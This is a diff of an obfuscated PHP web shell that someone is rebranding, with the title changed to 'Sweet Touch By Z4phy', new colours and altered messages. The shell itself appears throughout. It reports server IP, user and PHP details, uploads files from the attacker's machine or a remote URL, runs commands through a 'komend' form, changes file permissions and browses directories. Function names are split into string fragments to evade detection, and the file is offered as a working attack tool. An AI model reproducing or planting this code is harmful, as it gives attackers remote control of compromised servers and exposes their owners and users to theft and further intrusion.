@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<?php echo "<title>!~Z4PHV~!</title>"; ?>
+	<?php echo "<title>!~Sweet Touch By Z4phy~!</title>"; ?>
 	<meta name="robots" content="noindex">
 	<link rel="icon" href="https://img1.picmix.com/output/stamp/normal/3/6/9/8/2258963_44204.png" type="image/x-icon">
 </head>
-<body bgcolor="#1f1f1f" text="#ffffff">
+<body bgcolor="#4b0707" text="#ffffff">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <style>
 	@import url('https://fonts.googleapis.com/css?family=Dosis');
@@ -13,7 +13,7 @@
 	@import url('https://fonts.googleapis.com/css?family=Russo+One');
 body {
 	font-family: "Dosis", cursive;
-	text-shadow:0px 0px 1px #757575;
+	text-shadow:0px 0px 1px #bf9110;
 }
 
 body::-webkit-scrollbar {
@@ -21,30 +21,30 @@ body::-webkit-scrollbar {
 }
 
 body::-webkit-scrollbar-track {
-  background: #1f1f1f;
+  background: #4b0707;
 }
 
 body::-webkit-scrollbar-thumb {
-  background-color: #1f1f1f;
+  background-color: #4b0707;
   border: 3px solid gray;
 }
 
 #content tr:hover {
-	background-color: #636263;
+	background-color: #6b5a10;
 	text-shadow:0px 0px 10px #fff;
 }
 
 #content .first {
-	background-color: #25383C;
+	background-color: #a57c0b;
 }
 
 #content .first:hover {
-	background-color: #25383C
-	text-shadow:0px 0px 1px #757575;
+	background-color: #a57c0b
+	text-shadow:0px 0px 1px #bf9110;
 }
 
 table {
-	border: 1px #000000 dotted;
+	border: 1px #ffffff dotted;
 	table-layout: fixed;
 }
 
@@ -70,7 +70,7 @@ input,select,textarea {
 }
 
 .gas {
-	background-color: #1f1f1f;
+	background-color: #4b0707;
 	color: #ffffff;
 	cursor: pointer;
 }
@@ -95,7 +95,7 @@ select:after {
 }
 
 option {
-	background-color: #1f1f1f;
+	background-color: #4b0707;
 }
 
 .btf {
@@ -113,7 +113,7 @@ option {
 </style>
 <center>
 <?php
-echo '<font face="Bungee" size="5">!~Z4PHV~!</font></center>
+echo '<font face="Bungee" size="7">!~z4phy c0d3 b3p4s~!</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>';
 set_time_limit(0);
@@ -159,7 +159,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-	echo "<center><br>!~"."Z"."4"."P"."HV"."~!<br>19"."28</center>";
+	echo "<center><br>!~"." z"."4"."ph"."y "."~!<br>sh"."3L"." b3"."p4"."s "."c0"."d3</center>";
 	exit();
 }
 
@@ -355,15 +355,15 @@ function tuls($nm, $lk) {
 	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
 }
 
-echo "Se"."rv"."er"." I"."P : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=gold>".$_SERVER[$rad]."</font><br>";
-echo "We"."b S"."erv"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
+echo "1p"." s"."3r"."Ve"."r : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; 1p"." L"."o : <font color=gold>".$_SERVER[$rad]."</font><br>";
+echo "w3"."b s"."3rV"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
 $unm = "ph"."p_u"."na"."me";
-echo "Sys"."tem : <font color='gold'>".@$unm()."</font><br>";
+echo "Sys"."t3m : <font color='gold'>".@$unm()."</font><br>";
 $gcu = "g"."et_"."curr"."ent"."_us"."er";
 $gmu = "g"."et"."my"."ui"."d";
 echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
 $phv = "ph"."pve"."rsi"."on";
-echo "PH"."P V"."er"."sio"."n : <font color='gold'>".@$phv()."</font><br>";
+echo "PH"."P v"."3r"."s1o"."n : <font color='gold'>".@$phv()."</font><br>";
 echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
 echo "MySQL : ";
 if (@$fnct("my"."sql_co"."nne"."ct")) {
@@ -459,7 +459,7 @@ if (isset($_POST['upwkwk'])) {
 					}
 					echo "<br>";
 				} else {
-					echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>";
+					echo "<font color='red'>Ga"."ga"."L "."Ma"."se"."h !</font><br><br>";
 			}
 		}
 	} elseif (isset($_POST['linknya'])) {
@@ -481,7 +481,7 @@ if (isset($_POST['upwkwk'])) {
 					}
 					echo "<br>";
 				} else {
-					echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>";
+					echo "<font color='red'>Ga"."ga"."L "."Ma"."se"."h !!</font><br><br>";
 				}
 		}
 	}
@@ -494,16 +494,16 @@ echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
 <br>
 <input type="hidden" name="upwkwk" value="aplod">
 <input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" placeholder="https://z4p'.'hy.crot/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+<input type="text" name="darilink" class="up" placeholder="https://z4p'.'hy.crot/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="4" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
 </form>';
 echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
-Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
+c0'.'mm'.'4n'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
 <input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
 </form>';
 echo "</table><br>";
 
 echo '<hr><center style="font-family: Russo One">';
-echo tuls("HOME", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
+echo tuls("h0me", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
 //echo tuls("HOME");
 echo "<hr></center><br>";
 
@@ -538,7 +538,7 @@ if (isset($_GET['s3b4s'])) {
 			echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
 		}
 		echo '<form method="post">
-		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
+		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="5" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
 		<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
 		<input type="hidden" name="pilih" value="ubahmod">';
 		if ($_POST['ty'.'pe'] == "fi"."le") {
@@ -558,7 +558,7 @@ if (isset($_GET['s3b4s'])) {
 				echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
 			}
 			echo '<form method="post">
-			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
+			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="5" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
 			<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
 			<input type="hidden" name="pilih" value="ubahmod">';
 			if ($_POST['ty'.'pe'] == "fi"."le") {
@@ -576,7 +576,7 @@ if (isset($_GET['s3b4s'])) {
 				echo "<center>D"."ir : ".htmlspecialchars($_POST['c1eL'])."<br>";
 			}
 			echo '<form method="post">
-			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
+			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="5" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['c1eL'])), -4).'" />
 			<input type="hidden" name="c1eL" value="'.$_POST['c1eL'].'">
 			<input type="hidden" name="pilih" value="ubahmod">';
 			if ($_POST['ty'.'pe'] == "fi"."le") {
@@ -778,7 +778,7 @@ echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspaci
 echo "<tr>";
 $auutolkw = $srl($bsn($tokber), "", $tokber);
 $auutolkw = $srl("//", "/", $auutolkw);
-echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?c1eL=".$auutolkw."\">..</a></td>
+echo "<td><i class='fa fa-folder' style='color: #fbc000'></i> <a href=\"?c1eL=".$auutolkw."\">..</a></td>
 <td><center>--</center></td>
 <td><center>".fdt($auutolkw)."</center></td>
 <td><center>".gor($auutolkw)." / ".ggr($auutolkw)."</center></td>
@@ -802,7 +802,7 @@ foreach($tokbernya as $coldo){
 	$auutol = $srl("//", "/", $auutol);
 	if(!$idi($auutol) || $coldo == '.' || $coldo == '..') continue;
 	echo "<tr>";
-	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?c1eL=".$auutol."\">".$coldo."</a></td>
+	echo "<td><i class='fa fa-folder' style='color: #fbc000'></i> <a href=\"?c1eL=".$auutol."\">".$coldo."</a></td>
 	<td><center>--</center></td>
 	<td><center>".fdt($auutol)."</center></td>
 	<td><center>".gor($auutol)." / ".ggr($auutol)."</center></td>
